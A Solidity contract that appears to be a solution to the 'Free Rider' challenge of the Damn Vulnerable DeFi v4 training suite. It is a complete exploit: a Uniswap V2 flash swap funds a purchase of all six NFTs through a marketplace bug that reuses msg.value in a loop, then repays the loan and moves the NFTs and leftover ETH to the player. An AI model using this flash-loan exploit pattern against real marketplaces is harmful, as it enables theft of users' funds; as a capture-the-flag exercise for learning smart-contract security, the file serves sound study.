// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {WETH} from "solmate/tokens/WETH.sol";
import {IERC20} from "@openzeppelin/contracts/interfaces/IERC20.sol";
import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import {IUniswapV2Router02} from "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
import {FreeRiderNFTMarketplace} from "../../src/free-rider/FreeRiderNFTMarketplace.sol";
import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import {DamnValuableNFT} from "../DamnValuableNFT.sol";


contract FreeRiderAttacker {
    address public immutable pair;
    address public immutable nft;
    address public immutable token;
    address payable public immutable weth;
    address payable public immutable marketplace;
    address public immutable player;
    address public immutable router;
    address public immutable test;
    address public immutable recoveryManager;

    constructor(address _pair, address _nft, address _token, address _weth, address _marketplace, address _player, address _router, address _recoveryManager) {
        pair = _pair;
        nft = _nft;
        token = _token;
        weth = payable(_weth);
        marketplace = payable(_marketplace);
        player = _player;
        router = _router;
        test = msg.sender;
        recoveryManager = _recoveryManager;
    }

    function attack() external {
        console.log(IERC20(weth).balanceOf(address(this)), 'weth balance before flash swap');
        bytes memory data = abi.encode(weth, msg.sender);
        IUniswapV2Pair(pair).swap(15 * 10 ** 18, 0, address(this), data);
    }

    function uniswapV2Call(
        address sender,
        uint256 amount0,
        uint256 amount1,
        bytes calldata data
    ) external {
        require(msg.sender == pair, "not pair");
        require(sender == address(this), "not sender");

        uint256 flashSwapAmount = 15 * 10 ** 18; // weth

        WETH(weth).withdraw(IERC20(weth).balanceOf(address(this)));
        console.log(address(this).balance, 'balance');

        // steal the NFTs, because of issue with msg.value in a loop
        uint256[] memory ids = new uint256[](6);
        for (uint256 i = 0; i < 6; i+=1) {
            ids[i] = i;
        }
        FreeRiderNFTMarketplace(marketplace).buyMany{value: flashSwapAmount}(ids);
        console.log(address(this).balance, 'balance');

        // repay back uniswap flashswap
        uint256 fee = (flashSwapAmount * 3) / 997 + 1;
        WETH(weth).deposit{value: flashSwapAmount + fee}();
        WETH(weth).transfer(msg.sender, flashSwapAmount + fee);

        // transfer the NTTs to the recover manager
        for (uint256 i = 0; i < 6; i+=1) {
            DamnValuableNFT(nft).safeTransferFrom(address(this), player, i);
        }

        // transfer leftover ETH to player
        (bool success,) = address(player).call{value:address(this).balance}("");
        console.log(address(this).balance, 'balance');
    }

    function onERC721Received(address, address, uint256, bytes calldata) external pure returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}
    fallback() external payable {}
}
